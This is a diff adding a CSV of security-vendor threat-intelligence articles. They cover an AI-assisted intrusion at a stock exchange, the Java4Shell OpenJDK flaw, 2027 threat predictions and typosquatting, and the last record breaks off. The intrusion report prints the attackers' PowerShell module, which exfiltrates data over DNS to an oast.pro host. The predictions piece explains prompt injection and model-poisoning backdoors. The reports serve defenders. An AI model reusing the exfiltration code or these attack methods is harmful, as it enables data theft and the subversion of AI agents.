@@ -1,0 +1,737 @@
+ID,Story,Date,Category,Vendor,Source,Modules,Type,Title,Link,Context,Full Text
+6402c741468d,6402c741468d,2026-11-19 11:00 UTC,"Attacks, Breaches & Threat Intel",Broadcom / Symantec,Broadcom/Symantec Blog,AI Security; Identity Security Posture Management; Data Security Posture Management; Server & Workload Protection,Article,Major African Stock Exchange Targeted in AI-Assisted Attack,https://www.security.com/threat-intelligence/african-stock-exchange-ai-assisted-attack,"In those attacks the group exploited the ProxyShell and ProxyLogon vulnerabilities in public-facing Microsoft Exchange servers to install web shells, and it used a backdoor that...","What the commands revealed
+
+The commands used to run the modules give us an indication of what the attackers targeting this organization were interested in. In the modules’ commands, data is exfiltrated to a DNS server, and there's a sub-domain that changes according to what the command does – such as ‘spid1’ for Host and Process Enumeration and ‘awslocal1’ for Cloud and Devops Hunting, and so on. The functionalities of the modules included:
+
+Host and Process Enumeration (spid1, proc2, proc3, smbctx1, smbsc1): Collects the machine name, current user identity, mapped network drives, SMB connections, and running process trees (including parent processes and full command-line arguments via WMI).
+
+Cloud and DevOps Hunting (awslocal1): Searches for AWS CLI configurations, environment variables related to databases or secrets, and active processes for tools like Docker, Kubernetes, Terraform, Jenkins, and GitLab.
+
+Web Server (IIS) Profiling (iis1, iisa1, iisp2): Interrogates IIS using the WebAdministration module to map out local websites, application pools, physical disk paths, bindings, and pool identity users.
+
+Secret and Credential Scraping (cfg1, sites1, xpjs1, dep1, sysm1, sysh1, sysv2, gpp1, awsa1): Recursively scans local web roots, deployment directories (C:\Deployer), and the domain's SYSVOL network share. It specifically targets configuration files (.xml, .json, .env, web.config) looking for hardcoded passwords, Group Policy cpassword fields, AWS access keys, and database connection strings.
+
+Database Probing (rdsnet1, scq1): Attempts direct TCP connections to an AWS RDS PostgreSQL instance on port 5432 and uses integrated Windows authentication to query a Microsoft SQL Server for system user and version data.
+
+SharePoint and Source Code Enumeration (spf1, spl1, spd1, spd2, sps1, tfs1, tfs2): Loads the SharePoint PowerShell snap-in to iterate through all sites and document libraries, searching for files containing sensitive keywords like “aws”, “credential”, or “password”. It also queries Team Foundation Server (TFS) APIs for project lists.
+
+API Exploitation and Lateral Movement (api1, api2, map1, dbg1, adm1, admt1, adm2, keys1, key4, xtok1, cscs1, ipo1): Probes an internal API for debugging endpoints. It then attempts to authenticate to an admin endpoint using hardcoded credentials to extract JWT tokens. Finally, it uses extracted tokens and API keys to query authenticated endpoints for user profiles and banking data.
+
+SCCM Reconnaissance and Lateral-movement Targeting (cas1, wmi1, scq1, smbsc1): Queries the SCCM AdminService and WMI (SMS_R_System) to find which machine a given user, likely admin, last logged on to, and enumerates the SCCM server's shares.
+
+Harvested-credential Validation (keys1, key4, xtok1): Cycles through several harvested x-api-key values and a bearer token against the same endpoints to see which one works.
+
+Capital-markets Data Access (cscs1, ipo1): Queries critical endpoints for investor and market data
+
+Signs of AI authorship
+
+The case for AI authorship rests on how uniform the modules are. Each one opened with the same error-handling line, used the same outer try/catch, hex-encoded its output the same way and returned the same empty-output sentinel. The DNS exfiltration loop was copied byte for byte into all 41 modules. A programmer building a toolkit would normally write that function once, while a model asked for a standalone script each time has no reason to.
+
+Variable names were generic, and error handling was uniformly verbose. One module contained a progress variable that no other module had, as if a model had improved a single script in isolation during iterative prompting. Another submitted an invalid credential as a deliberate test. The pace was also consistent with automated tooling, with a new module starting every few seconds. The level of detail included in the commands is another tell-tale sign that AI was used:
+
+$ErrorActionPreference = 'SilentlyContinue' try { $a = [string]((& { $j=Start-Job -ScriptBlock {try{Get-WmiObject -ComputerName '<redacted>-SCCM.<redacted>.com' -Namespace 'root\sms\site_<redacted>' -Class SMS_R_System -Filter ""LastLogonUserName='<redacted>'"" -Property Name,LastLogonUserName,ResourceId -ErrorAction Stop|ForEach-Object{'NAME='+$_.Name+';USER='+$_.LastLogonUserName+';RID='+$_.ResourceId}}catch{'WMIERR='+$_.Exception.GetBaseException().Message}} if(Wait-Job $j -Timeout 18){Receive-Job $j}else{Stop-Job $j;'WMIERR=TIMEOUT'};Remove-Job $j -Force } | Out-String).Trim()) } catch { $a = 'ERR:' + $_.Exception.Message } $b = -join ([Text.Encoding]::UTF8.GetBytes($a) | ForEach-Object { $_.ToString('x2') }) if ($b.Length -eq 0) { $b = '454d505459' } for ($i = 0; $i -lt $b.Length; $i += 50) { $n = [Math]::Min(50, $b.Length - $i) $v = $b.Substring($i, $n) try { [Net.Dns]::GetHostAddresses(""$i.$v.wmi1.danoam334iqjo0ap2scg6ofosjxfgqhsa.oast.pro"") | Out-Null } catch {} }
+
+None of these signals is conclusive on its own, but taken together they fit AI-assisted or AI-generated authorship better than they fit bespoke attacker tooling. We could not identify which model may have been used.
+
+DNS exfiltration through a testing service
+
+Each module hex-encoded its output, split it into 50 hex character chunks and resolved a DNS name for each chunk. The names were unique subdomains of a single token under oast[.]pro, a public out-of-band testing service. The output would have left the server as DNS lookups rather than as web requests, and it would have been collected by whoever controlled the token. This is the exfiltration loop as it appeared in the modules:
+
+$b = -join ([Text.Encoding]::UTF8.GetBytes($a) | ForEach-Object { $_.ToString('x2') }) if ($b.Length -eq 0) { $b = '454d505459' } for ($i = 0; $i -lt $b.Length; $i += 50) { $n = [Math]::Min(50, $b.Length - $i) $v = $b.Substring($i, $n) try { [Net.Dns]::GetHostAddresses(""$i.$v.<module>.<token>.oast[.]pro"") | Out-Null } catch {} }
+
+This is an unusual technique and may have been an additional attempt by the actors involved in this activity to stay under the radar and avoid detection.
+
+Witchetty and the attribution question
+
+Witchetty was first documented by ESET in April 2022 as one of three sub-groups of TA410, a cyberespionage operation with some links to the Cicada (aka APT10) group. In September 2022, we reported on Witchetty attacks carried out between February and September of that year against two governments in the Middle East and this same African stock exchange. In those attacks the group exploited the ProxyShell and ProxyLogon vulnerabilities in public-facing Microsoft Exchange servers to install web shells, and it used a backdoor that hid its payload in an image.
+
+Six persistence implants were present on the server in April 2026, and one of the Witchetty implants was first seen in 2020. The toolkit was different. It was modular and focused on cloud secrets and financial APIs, and it ran from a web shell under the IIS worker process, which suggests that a vulnerability may have been exploited to gain access. Web shells on public-facing servers featured in the 2022 Witchetty attacks, but the focus on cloud secrets and financial APIs differs from the Witchetty activity we have seen in earlier cases. For that reason, we treat the implants and the toolkit separately.
+
+Three explanations fit the evidence. Witchetty may have returned with new tooling. A second and more capable operator may have used the access that Witchetty established. Or an unrelated actor may have used the same compromise. We could not rule out any of them.
+
+Significance
+
+The toolkit is notable for how it was produced as much as for what it did. If the modules were generated by a model, an operator could produce 41 purpose-built scripts for one target without writing the shared plumbing by hand, and run them in a little over three minutes. The uniformity that points to AI authorship also gives defenders something to look for, since the same scaffold and exfiltration loop appeared in every module.
+
+The targets of the credential tests were the exchange's own investment API and a securities depository gateway. We found no evidence of privilege escalation or data theft, and the results of the modules went to a collector that we cannot see. Whether any credentials or keys worked, and what the attackers intended to do with them, remains unknown. However, the targeting of a financial institution like a stock exchange is in itself significant and does seem to follow with the ongoing trend of attackers focusing on financial organizations, while now also using AI to carry out these attacks.
+
+Protection
+
+For the latest protection updates, please visit the Symantec Protection Bulletin.
+
+If an IOC is malicious and the file is available to us, Symantec Endpoint products will detect and block that file.
+
+Indicators of Compromise
+
+File indicators
+
+8940de2ada979ad2c53ece0b5cb84100c4df0a024b4b363e96cb6a67469e30d5 - Mimikatz
+
+5c4f6e21877dfd71e3e95254c6193457e9aab10aca7459ddaeb6d711997190de - Loader
+
+982750f4f9edd2ef51b9972a1018a8777bd9d65e0d2e43977a522bdc73ddef5f – Persistence implant that hijacks the Avast wsc_proxy component
+
+1363534d205ad60f6700d81f2af2c0ce6d959b73fd405adbb598072395bd26e5 – Persistence implant (ShellcodeLoader)
+
+0ad7e39ce6b9b7637a002c352637089f6ccf8ae39206a7d895266b21ca26ff0f – RC4-encrypted loader
+
+2e223e3c6dc7a130f0281a6c608cd58c153ec026c020c8a661b60a1e285140bf – Utility that base64-encodes beacon.bin, XORs it with 0x53 and writes Default.xml
+
+5a2f093f7ae25c5e381647549496acf375e18dd95263b921518e340ee78e5377 – DLL loader that runs only inside svchost, decrypts WindowsUpdate.xml with XOR 0x53 and maps the payload in memory
+
+b1155f47910f032217352c3a302c01de4d15cabda34331d2866f5d7a52b3ecde – Similar loader, host process svchost.exe
+
+b737eae170534f5965b90f4af807cb3f728498f3bccc9355a0afc0171e413230 – Similar loader, host process svchost.exe
+
+5fd9a352d1bec4a11134ee140aa278d07d720b45493a7f01a548293f412972ce – Similar loader, host process svchost.exe
+
+242c411cd415d55e67aae75759e5c07720fcdddc0378b5e35d4c1e4ab2b01eb8 – Similar loader, host process svchost.exe
+
+af3737ba032b8c5d3403064899ab6cc48610a397d9f67b626f99b2f0f5082202 – Similar loader, host process VSPerfCmd.exe
+
+6b3061d6e042744bb484b725031e7916b31ad224318a8c0441b9ead14ab853d5 – DLL loader that decrypts setting.dat with a repeating 16-byte XOR key and maps it in memory
+
+9b4dadaa55479727f7c0034ff9c07165597b9a9a9376b6e564634eeaf1c6b876 – DLL loader that decrypts setting.dat with a repeating 16-byte XOR key and maps it in memory
+
+d732660db5af253aacbc580d6114d59d233c48b3a5ead6dcfcb55246252abed2 – DLL loader that decrypts setting.dat with a repeating 16-byte XOR key and maps it in memory
+
+85e75e78a545d2fe11ac19385cc8c0789e1056a2cd4edfec32a6a6b113001e5a – Loader that decodes mfeann.log and injects it as x64 shellcode
+
+1c1704d789332c4d6ce57139d27194ac64c27bfbb1368f1006ffc3c96f3bcb80 – Nim-compiled DLL impersonating VSPMsg.dll, loader for Msg.log
+
+3ca9d65046420592e726776bb26b08719721d108f6947fd22af1d5e7cac33edc – Cobalt Strike beacon
+
+30dc80cb4c791d80eb21597232fb2f5a4111bf3dfad32c736b789d77127310ef – Cobalt Strike beacon
+
+152c125eacdacc69406b120afd95994eef0f7a0cd638c2d8723e64f79344a336 – Cobalt Strike beacon
+
+8129e103509f00f40a6a2740b76bc3f9449ac09cd9222ba289e52e86f31f616e – Cobalt Strike beacon
+
+26dc22c99e5e88363818e56dc5883258f048e426c9aa515887bf5d06872782f9 – Not available for analysis
+
+53ddb6c51aca4bd6b00ed83a8019ee1440351f8eeb95a7b6c74a2b75210d85b2 – Not available for analysis
+
+af295b5081ccdfd601a0aaecaa81fe1aa92125b548063863dbca2011cef658ce – Not available for analysis0f2c40d31887418de304ca182afb4f4fecfe95937068f11fc798778c2ca95e3f – mfeann.exe
+
+002ce0d28ec990aadbbc89df457189de37d8adaadc9c084b78eb7be9a9820c81 – vsperfcmd.exe
+
+Network IOCs
+
+danoam334iqjo0ap2scg6ofosjxfgqhsa[.]oast[.]pro"
+f28ec1324dd9,a3d815e35bcf,2026-11-18 11:39 UTC,Vulnerabilities & Patching,Broadcom / Symantec,Broadcom/Symantec Blog,Vulnerability Management; Identity Security Posture Management,Article,Java4Shell: Critical OpenJDK Flaw Allows Unauthenticated Remote Code Execution,https://www.security.com/threat-intelligence/java4shell-cve2026114938-patch-now,"2 (Critical), according to Calif, which discovered the flaw, and 8","Key findings
+
+CVE-2026-114938, which has been dubbed Java4Shell, is a critical heap overflow in the Base64 decoder of the OpenJDK HotSpot Java Virtual Machine (JVM) on x86-64. It has a Common Vulnerability Scoring System (CVSS) v4.0 score of 9.2 (Critical), according to Calif, which discovered the flaw, and 8.1 (High) on CVSS 3.1 per OpenJDK's advisory.
+
+A remote, unauthenticated attacker who can deliver crafted Base64 input to a vulnerable Java process can corrupt heap memory and achieve remote code execution (RCE). No user interaction is required for server-side attacks.
+
+Only hosts with AVX-512 Vector Byte Manipulation Instructions (VBMI) are exposed. That means Intel Ice Lake or newer, or AMD Zen 4 or newer. ARM64 hosts, Java 11 and standard OpenJDK 8 are not affected.
+
+Security company Calif demonstrated pre-authentication RCE in test configurations of Keycloak, Jira, Confluence, Artifactory, Jenkins and PingFederate.
+
+Oracle and OpenJDK released fixes on November 17, 2026. Fixed builds end in "".1"", and the same version number without the suffix remains vulnerable.
+
+No in-the-wild exploitation had been reported as of publication, but a proof-of-concept trigger is public. Symantec and Carbon Black Security Response is investigating, and up-to-date protection information will be added to our Protection Bulletin.
+
+Overview
+
+A critical vulnerability in OpenJDK, CVE-2026-114938 (aka Java4Shell), was disclosed on November 17, 2026. The flaw sits in the optimized Base64 decoder that the HotSpot JVM uses on x86-64 processors with AVX-512 VBMI support. Oracle and OpenJDK have released patches, and the U.S. Cybersecurity and Infrastructure Security Agency (CISA) urged immediate patching. At time of writing on November 18 there has been no evidence found of in-the-wild exploitation of this bug.
+
+Java4Shell is significant because Base64 decoding is routine in server software. Authentication headers, JSON Web Tokens (JWT), Security Assertion Markup Language (SAML) assertions, file uploads and API fields are all Base64 encoded, so internet-facing login and API services decode attacker-controlled data by design. Calif, the security firm that first reported the flaw, published a standalone trigger and said product-specific exploit chains would be held back until upgrades are more widespread. Details about the flaw became public before patches were available.
+
+How the vulnerability works
+
+The store mask used by the decoder is wrong when the Base64 input ends in padding. As a result, the calculated output length underflows, and the decoder writes a full 64 bytes into a buffer that is smaller than that. According to Calif, a 65-byte input overflows the heap by 62 bytes, which corrupts adjacent Java objects, allowing an actor to gain heap read and write primitives, which makes the bug remotely exploitable.
+
+Exploitation of the heap overflow depends on the layout of the target application, and a failed attempt can crash the JVM. A crash would result in denial of service, but Calif reported that retries often succeed. Heap memory disclosure is also possible. A client-side variant exists: a Java application that connects over Transport Layer Security (TLS) to a malicious server can be compromised.
+
+Who is affected?
+
+Affected versions are OpenJDK 17.0.6 and later (including 17.0.6 to 17.0.21), Java 21 before 21.0.13.1, Java 25 before 25.0.5.1 and Java 27. Oracle also lists Java SE 8 8u511b33-perf. Builds from Oracle, Corretto, Temurin, Microsoft, Zulu, Liberica, SapMachine, Red Hat and GraalVM are affected. Hosts must also run on an x86-64 processor with AVX-512 VBMI, which includes Intel Ice Lake and newer and AMD Zen 4 and newer. Java 11, standard OpenJDK 8, ARM64 hosts and x86 processors without AVX-512 VBMI are not affected.
+
+Enterprise and server deployments carry the most risk, particularly identity, application lifecycle, build pipeline, artifact and data platforms. Popular Java-based applications such as Jira, Confluence, Jenkins, Keycloak, Kafka and Elasticsearch could be affected. Many of these products ship their own bundled Java runtime, so organizations should check each vendor for updated releases and should not rely on the host's Java version alone. Consumers are mainly exposed through Java client applications.
+
+Exploitation status
+
+No in-the-wild exploitation had been reported as of November 18, 2026. However, Calif published a trigger that reproduces the overflow. It also showed pre-authentication RCE in Jira, Confluence, Jenkins, Keycloak, JFrog Artifactory and PingFederate, as well as post-authentication RCE in Apache Kafka, Solr, Elasticsearch, Gerrit and Spinnaker. Fake proof-of-concept repositories are likely to appear, and unpatched internet-facing Java services on AVX-512 hardware should be treated as potentially exposed.
+
+Patching
+
+Oracle released fixes in its November 2026 Critical Patch Update, alongside an OpenJDK advisory of the same date. Fixed builds are:
+
+Java 17: 17.0.21.1
+
+Java 21: 21.0.13.1
+
+Java 25: 25.0.5.1
+
+Java 27: 27.0.1.1
+
+Java SE 8 (-perf builds): see the Oracle advisory
+
+A running JVM keeps the vulnerable code until it is restarted, so every Java process must be restarted after upgrading. Containers should be rebuilt on patched base images. Downstream vendors are rolling out their own fixes, and fixed builds for several of them were not yet published at time of writing. CISA also advised identifying all Java installations, including those bundled in third-party applications, containers and appliances, and prioritizing internet-facing systems.
+
+Interim mitigations
+
+Where patching is not immediately possible, Calif lists two JVM options. Both require a restart and neither replaces patching.
+
+Add -XX:-UseBASE64Intrinsics to disable the Base64 intrinsics. This may slow Base64-heavy workloads.
+
+Add -XX:UseAVX=2 to disable AVX-512. Use this on x86-64 hosts only, because the JVM will not start with it on ARM.
+
+Do not set -XX:DisableIntrinsic=_base64_decodeBlock on its own. It breaks JVM startup and can cause an outage if pushed fleet-wide.
+
+CISA also recommended compensating controls such as validating Base64 input at the application boundary, enforcing input size limits and limiting unauthenticated access. Defenders can look for Base64 tokens that contain an equals sign and whose length is not a multiple of four, decoder exceptions such as “Input byte array has wrong 4-byte ending unit” in application logs, and unexpected JVM crashes or new hs_err_pid log files. The exception is thrown after the overflow, so it indicates an attempt and not a blocked attack.
+
+Protection
+
+Symantec and Carbon Black Security Response is investigating this vulnerability, guidance and reproduction steps. Full protection information is in the Symantec Protection Bulletin for Java4Shell. The bulletin will be updated continuously as new information becomes available."
+000a1c6998b0,000a1c6998b0,2026-11-17 11:00 UTC,"Attacks, Breaches & Threat Intel",Broadcom / Symantec,Broadcom/Symantec Blog,AI Security; Identity Security Posture Management; Vulnerability Management; Endpoint Security,Article,"Attackers Pick the Target, AI Does the Rest: Cyber Predictions for 2027",https://www.security.com/threat-intelligence/cyber-ai-predictions-2027,"We expect more of the same in 2027: encrypting ransomware as the steady baseline, with extortion-only waves arriving whenever an attacker finds a zero-day in widely used software","Key points
+
+Humans will pick the target, but AI will run most of the attack.
+
+AI credentials will become the new cloud keys.
+
+Shadow AI agents will present a new challenge.
+
+Patching alone will not be enough to tackle modern threats.
+
+Ransomware will break another record, with data-theft waves on top.
+
+The line between spies and criminals will keep blurring.
+
+As the AI juggernaut continues to roll on, in 2027 we may reach a point where cyber attackers need to do little more than pick a target and collect the money, information or access at the end. AI agents will increasingly handle reconnaissance, exploitation, credential theft and lateral movement, working at machine pace.
+
+Last year, we predicted that agentic AI would lower the barrier to entry for attackers. Over the past 12 months we have watched that happen, and most of our predictions for 2027 extend what we are already seeing, while one or two go further. As organizations give AI agents standing access to their data, we would not be surprised to see a major breach in which the attacker brought almost no tools of their own, because the victim’s own agents did the work.
+
+Humans will pick the target, but AI will run most of the attack
+
+Until recently, attackers used AI as an assistant, however, increasingly, they are putting it in charge. The “Skynet” agent we reported on in October 2026 wired a large language model (LLM) into the center of an attack tool. The tool had around 74 callable functions covering reconnaissance, exploitation, credential theft and botnet control. Its operators described the unattended setting as “Skynet mode” and authorized it to run up to 100,000 steps without human approval.
+
+This is not yet the norm. Most intrusions still have a human at the keyboard making the important decisions. But the direction is clear, and Google’s threat analysts and others have described the same shift from chat-based assistance to agentic orchestration. An agent does not sleep, does not need to be paid and can run many intrusions at once. An operator who once handled one victim at a time could now supervise agents’ activity on dozens.
+
+While agents deployed in most organizations today still run under constrained scopes or human-in-the-loop approvals, they are vulnerable to prompt injection attacks or indirect tool abuse, which could place them under the control of attackers without them even needing to exploit a vulnerability to send the agent rogue. Prompt injection attacks involve the hackers feeding a malicious prompt directly into a LLM that they have gained access to, while an indirect attack involves hackers hiding their payloads or instructions in data consumed by the LLM – such as software tickets, code reviews or web pages that the LLM has been instructed to read. The attackers are essentially tricking the LLM, no vulnerabilities required.
+
+Model poisoning is another way that attackers can potentially interfere with AI agents’ operations. It involves tampering with the data, fine-tuning samples, or open-source weights that an AI uses to learn, so that the AI develops a deliberate blind spot or backdoor known only to the attacker. Security teams are generally so worried about protecting credentials and endpoints, they may not think about whether the intelligence inside the model itself has been compromised. These attacks are also often difficult to detect as the model appears to be functioning normally, and strange outputs may simply be put down to hallucinations.
+
+In 2027 and beyond we expect the human role in many AI-driven cyber attacks to shrink towards choosing targets and collecting the money. Reconnaissance, exploitation, credential theft and lateral movement will increasingly be handled by agents working at machine pace, which means the gap between first access and damage will keep closing. Low-skilled attackers will benefit most: capabilities that once needed a team of specialists will be available to anyone who can point an agent at a list of targets. For defenders, the quality of attacker tradecraft will matter less than its volume.
+
+Agents will also change what attackers use. Living off the land, where attackers use tools already present on the victim’s network, has been one of the defining tactics of the past decade. The next version may be living off the AI: attackers turning the victim’s own coding assistants and agents, and the permissions they hold, against the organization. Gartner forecast task-specific agents in around 40% of enterprise applications by the end of this year, and every one of them holds standing credentials and access to data. We would not be surprised to see the first major breach in which the attacker brought almost no tooling of their own, because the victim’s agents did the work.
+
+AI credentials will become the new cloud keys
+
+Attackers learned long ago that cloud credentials were worth stealing, and AI credentials are their newest target. Our recent research on the Aoki infostealer found it harvesting credential and session files for Claude, Codex, Cursor, Gemini and other AI coding assistants. Skynet, for its part, scans for exposed AI endpoints and uses them to fund and conceal its operations, leaving the victim to pay for every step.
+
+There is a market for what they steal. Google found that underground prices for AI accounts more than doubled in 2026. Stolen AI access is useful in several ways: free computing power, a way around bans imposed on accounts that have been abused, and a way to strip safety controls from commercial models. Attackers can steal AI access in order to run AI-driven attacks.
+
+In 2027, we expect AI keys to join browser cookies and crypto wallets as a standard target for infostealers, and for the resale of stolen AI access to mature into its own underground business, much as initial access brokers did for network access. Developers will be the main targets. A coding assistant’s configuration files can tie together API keys, source code repositories and cloud accounts, which makes a developer’s workstation one of the most valuable machines in the organization. Many victims will discover the theft through an unexpected bill, not an alert.
+
+AI providers will respond with shorter-lived tokens and tighter controls, as the cloud providers did. Attackers will respond by stealing live sessions instead of static keys. If the history of cloud credentials is a guide, it will take organizations a couple of painful years to treat AI credentials with the same care as the rest.
+
+Shadow AI agents will present a new challenge
+
+As the use of AI continues to become more commonplace across almost all organizations and workplaces, we may see a shift from the traditional issue of “shadow IT” where software, hardware, or other services are used without the knowledge or approval of the enterprise’s IT department, to “agent shadow IT”, where AI tools are being used without the knowledge or approval of organizations’ IT or security departments.
+
+This could be employees using things like AI tools, local models, or unapproved plugins to get their work done faster, without telling their IT or security departments. This is likely to become a bigger issue and has been observed already today where security teams cannot protect what they do not know exists. These unofficial AI helpers often have direct access to company data and code, which may get fed back to whoever is running the AI without restrictions or specialized agreements being in place instructing the AI not to leverage or use the data, leading to this becoming a leak or information disclosure issue.
+
+This could also be a more pronounced issue in markets where the popular, Western AI coding assistants are not legitimately available, leading to those wanting to use them turning to rogue operators. A recent Symantec Threat Hunter Team blog discussed how a grey market relay service was installing the genuine OpenAI Codex and Anthropic Claude Code CLIs on enterprise systems and then reconfiguring them to route every request through third-party infrastructure instead of the vendors' own servers. This activity was mostly impacting a variety of enterprises across mainland China where many Western AI coding assistants are not officially available.
+
+Of note was that this operation also disabled the CLI's execution sandbox entirely, enabling network access for the write sandbox, replacing the user's real API credentials with relay-issued tokens, and disabling telemetry and error reporting. While there was no evidence found in this case that the relay operator had abused their level of access, a potential risk is that the configuration it installed would let the operator read every prompt, file, and secret passed through the agent and run commands with the user's full privileges. Given this was not a legitimate service, it’s unlikely any IT or security oversight for this product existed in the organizations where it was being used.
+
+Patching alone will not be enough to tackle modern threats
+
+The PHP2Shell vulnerabilities (CVE-2026-109618 and CVE-2026-109619) show how short the patching window has become. Both flaws allow unauthenticated remote code execution. Technical details leaked on October 20, 2026, a day before the PHP project released fixes, and public proof-of-concept code followed. Attackers did not need to be clever. They just needed to be early.
+
+Defenders are told to patch faster, but patching is a race against machines that defenders cannot win. Testing and deploying a critical patch takes days or weeks, and for some systems, like those older PHP versions, it never happens. AI is shrinking the patching window. It can increasingly read a patch, compare it with the old code and produce a working exploit in minutes, and it can scan open-source projects for flaws before the fixes ship.
+
+Vulnerabilities are also only part of the problem. Attackers using AI are just as good at finding what has no CVE: misconfigurations, forgotten internet-facing systems, default or reused credentials and over-permissioned identities, and at chaining several low-severity weaknesses into a working attack path. In 2027 we expect more breaches in which no single vulnerability was to blame.
+
+So, we expect the conversation to shift from how fast organizations patch to how fast they can make a threat irrelevant, whether or not a patch exists. Think of it as mean time to mitigate. The answer will lean on controls that do not depend on knowing the vulnerability: behavioral blocking, default-deny application control, tight segmentation and identity protections that stop an attacker using what they have stolen. Patching will still matter. It just may not be enough.
+
+Ransomware will break another record, with data-theft waves on top
+
+Ransomware shows no sign of slowing. There were 3,126 claimed attacks in the third quarter of 2026, the highest quarterly total we have recorded, including the busiest single month, August, with 1,184. Across the first three quarters of 2026 there were 7,777 claimed attacks, 28% more than in the same period of 2025 and already close to the 8,498 recorded in the whole of last year.
+
+The line-up behind those numbers keeps changing. Over the past 12 months, Qilin has been the busiest operation with 1,457 claimed attacks, followed by The Gentlemen with 870, a group that did not feature in our 2025 top 10. Akira (604), Inc (482) and DragonForce (391) follow behind. LockBit, which had struggled to rebuild after the disruption of its operation in 2024, is back with 365.
+
+Data-theft-only extortion is less predictable. It surged in 2025, driven by a handful of mass campaigns, notably Cl0p’s attacks on Oracle E-Business Suite and the Salesforce-related attacks carried out by ShinyHunters, and it fell back in 2026, with 808 identified extortion-only attacks in the first three-quarters of 2026, against 1,187 a year earlier. One campaign against a vulnerability in a widely used enterprise product can add hundreds of victims of these kinds of attacks in a single quarter, making the likely volume of these kinds of attacks harder to predict.
+
+We expect more of the same in 2027: encrypting ransomware as the steady baseline, with extortion-only waves arriving whenever an attacker finds a zero-day in widely used software. Encryption may keep its place partly because it pays better: Coveware found victims paid in only around 15% of cases in the second quarter of 2026 where leaking data was the only threat.
+
+The line between spies and criminals will keep blurring
+
+Many of the threat actors we track no longer fit neatly into a single category. Our research on Jewelbug found a China-based group running espionage operations and a cryptocurrency fraud business from the same infrastructure and the same control panel. On one side it compromised government webmail in the Middle East. On the other, it ran an AI-generated network of fake exchange download pages to target Chinese-speaking crypto users. We assess that the fraud business most likely supplied access, infrastructure and delivery for the espionage.
+
+Warlock, a ransomware operation we wrote about in our Ransomware 2026 whitepaper and blogged about more recently in October 2026, fits the pattern too. Some of its tools trace back to earlier Chinese espionage activity, and ransomware may at times serve to obscure espionage.
+
+We expect this to go further in 2027. Governments that want deniable capabilities have every incentive to let contractors fund themselves through e-crime, and criminals gain tooling, protection or simply tolerance in return. The result is groups whose motives change from one intrusion to the next: espionage on Monday, extortion on Friday.
+
+We expect to see more high-profile incidents in which ransomware turns out to have been a cover for espionage or sabotage, and incident responders will have to start asking what the ransomware was hiding. Attribution will get harder, and the stakes will rise with it. Defenders may need to stop running separate playbooks for ransomware and espionage. Every ransomware incident should include a search for earlier access and for what was taken before anything was encrypted.
+
+What to do about it?
+
+Several of the trends above share one answer: reduce what attackers can do once they are on a network. Behavioral protection, visibility across endpoints and cloud, and governing how AI is used inside your organization matter more than ever when exploits arrive faster than patches. For resource-strapped teams or complex enterprises looking to deepen visibility and correlate signals across their stack, solutions such as Symantec CBX can fill that gap.
+
+Learn more in our predictions webinar
+
+Catch a live breakdown of what’s ahead in our 2027 Threat Predictions webinar with Principal Intelligence Analyst Dick O'Brien and Threat Analyst Alan Neville on December 16, 2026. Register now to gain expert insights into the key AI, ransomware, and espionage trends to plan for in 2027."
+6eb5edcd7238,6eb5edcd7238,2026-11-16 11:00 UTC,"Attacks, Breaches & Threat Intel",Broadcom / Symantec,Broadcom/Symantec Blog,Code Security; Threat Intelligence,Article,Typosquatters Copy Big Brands’ New Domains Within a Day of Registration,https://www.security.com/threat-intelligence/typosquatting-new-brand-domains,Only two pairs did anything else,"The name changes were small. Classic typosquatting techniques such as keyboard-adjacent swaps, homoglyphs or hyphen insertion were absent. Instead, the actors favored edits that kept the name readable and plausible, which a hurried reader would be unlikely to notice.
+
+Of the 27 pairs, 15 dropped a plural or possessive “s” (fyzadasavings became fyzadasaving), six left out a single letter (greystarbenefits became greystarbenfits) and four collapsed a double letter (mywayconnect became mywayconect). That makes 25 plain deletions. Only two pairs did anything else. One added a letter (tradealgotcpasettlement became tradealgotcpassettlement) and one swapped a vowel (yourmsdbenefits became yourmsdbenifits).
+
+The dropped plural “s” was the most common edit. Savings became saving, claims became claim and sweeps became sweep. People often say and type the singular form, which may make these the most effective typos. The actors also folded novelty top-level domains (TLDs) back into .com, likely because users default to it; carmax[.]claims became carmaxclaim[.]com and mcdonaldsmedia[.]network became mcdonaldmedianetwork[.]com. A single lookalike could also shadow several authentic domains. For example, carmaxclaim[.]com covered both carmax[.]claims and carmaxclaims[.]com, while yourmsdbenefits[.]com drew three separate variants from two registrars.
+
+Monetization
+
+When queried, the lookalikes served one of three kinds of content. Some were parked placeholder pages that earned money from pay-per-click advertising feeds. Others were deceptive search portals whose results led to scam blogs, or brand-themed blogs written around the typosquatted name and packed with ads that routed visitors to scam sites.
+
+This low-grade scam traffic may not be the end goal. Advertising networks of this kind can also be abused for malvertising and credential harvesting, and a domain that serves ads today could serve a fake claims form tomorrow with a single Domain Name System (DNS) or content change. Visitors who reach these domains are already primed to enter personal details. Symantec continues to track the campaign’s scope and persistence.
+
+Protection
+
+WebPulse, the collaborative intelligence cloud behind Symantec web security, placed the identified domains in security categories and can catch new variants through shared detection patterns.
+
+For more information on Symantec protection against this campaign, see the Protection Bulletin.
+
+Indicators of Compromise
+
+ontherockrebate[.]com
+
+mypgsweep[.]com
+
+asrelbisaving[.]com
+
+fyzadasaving[.]com
+
+ijornisavings[.]com
+
+healthspringproducer[.]com
+
+arlocareheath[.]com
+
+hithebeamsweeps[.]com
+
+mywayconect[.]com
+
+sunharbosaving[.]com
+
+getpgsoffer[.]com
+
+celmodpharmacy[.]com
+
+mcdonaldmedianetwork[.]com
+
+aveirwirless[.]com
+
+insulinsavingprogram[.]com
+
+ukvaluestudy[.]com
+
+greystarbenfits[.]com
+
+carmaxclaim[.]com
+
+kmxclaim[.]com
+
+aildatasettlment[.]com
+
+tradealgotcpassettlement[.]com"
+ccc88de1507e,ccc88de1507e,2026-11-12 11:00 UTC,"Attacks, Breaches & Threat Intel",Broadcom / Symantec,Broadcom/Symantec Blog,AI Security; Server & Workload Protection; Endpoint Security; Threat Intelligence,Article,How AI Revived a Stalled Attack on a U.S. Retailer,https://www.security.com/threat-intelligence/ai-assisted-attack-us-retailer,"Similar labelled scripts also appeared on September 18, 2026 on three database servers in the same network, so the web server was not the first place the attackers appeared to...","How the attackers used AI
+
+Phase one: hand-typed commands
+
+Activity on the web server began on September 21, 2026, with a short burst of discovery commands, followed by a gap of about 12 hours. When it resumed on September 22, the commands showed the marks of manual typing. Across 110 distinct actions there were three typing errors (including systemifo and pwoershell), each corrected within seconds, and the command lengths averaged about 45 characters. The attackers re-ran the same blocked loader five times in about 20 minutes with no change of approach.
+
+Phase two: AI-generated commands
+
